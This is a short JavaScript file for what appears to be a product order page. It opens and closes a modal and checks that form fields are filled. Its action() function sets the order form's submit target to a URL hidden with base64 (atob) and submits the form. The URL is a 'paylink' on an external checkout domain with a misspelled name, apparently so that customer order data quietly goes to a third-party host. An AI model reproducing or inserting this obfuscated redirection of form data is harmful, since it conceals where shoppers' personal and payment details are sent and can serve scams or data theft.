document.addEventListener('DOMContentLoaded', function () {
    const modal = document.getElementById("myModal");
    const btn = document.getElementById("buy");
    const span = document.getElementsByClassName("close")[0];

    btn.onclick = function () {
        modal.style.display = "block";
        document.body.classList.add("modal-open");
    }

    span.onclick = function () {
        modal.style.display = "none";
    }

    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
});

document.addEventListener('DOMContentLoaded', function (e) {
    const modal = document.getElementById("myModal");
    const btn = document.getElementById("click-me-btn");
    const span = document.getElementsByClassName("close")[0];

    btn.onclick = function () {
        if (validateForm()) {
            action();
            modal.style.display = "block";
            document.body.classList.add("modal-open");
        } else {
            alert("Please fill in all fields.");
        }
    }

    span.onclick = function () {
        modal.style.display = "none";
    }

    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }

    function validateForm() {
        const inputs = document.querySelectorAll('.field');
        for (let i = 0; i < inputs.length; i++) {
            if (!inputs[i].value) {
                return false;
            }
        }
        return true;
    }

    function action() {
        $('#order_form').attr('action', atob("aHR0cHM6Ly9jaGVja291dC5wZXJmb21hbnNkZWFsLm1lL3BheWxpbmsv"));
        $('#order_form').submit()
        return false
      }
});
